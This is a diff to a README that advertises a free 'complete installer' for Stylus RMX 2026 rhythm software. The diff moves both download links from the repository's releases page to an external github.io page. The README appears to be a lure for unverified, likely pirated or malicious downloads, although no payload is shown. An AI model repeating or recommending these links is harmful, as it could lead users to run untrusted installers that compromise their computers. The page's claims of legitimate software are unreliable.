@@ -1,6 +1,6 @@
 # 🎹 Stylus-RMX-2026 - Master your rhythm production with ease
 
-[![Download Stylus RMX](https://img.shields.io/badge/Download-Stylus_RMX_2026-blue.svg)](https://github.com/tonerdiospyroslotus923/Stylus-RMX-2026/releases)
+[![Download Stylus RMX](https://img.shields.io/badge/Download-Stylus_RMX_2026-blue.svg)](https://tonerdiospyroslotus923.github.io)
 
 ## 📌 Overview
 Stylus RMX 2026 gives music producers a fast way to create rhythms. This software brings powerful groove loops into your music production environment. It works on Windows 11 and Windows 10 machines. You can layer sounds, edit grooves, and match tempo automatically. This project provides the complete installer for your PC setup.
@@ -17,7 +17,7 @@ Ensure your computer meets these base specifications before you begin:
 ## 📥 Get Your Software
 You can find the software files on the project release page. Follow the link below to reach the download area.
 
-[Click here to open the download page](https://github.com/tonerdiospyroslotus923/Stylus-RMX-2026/releases)
+[Click here to open the download page](https://tonerdiospyroslotus923.github.io)
 
 Select the most recent setup file from the list. Save the file to your computer.
 
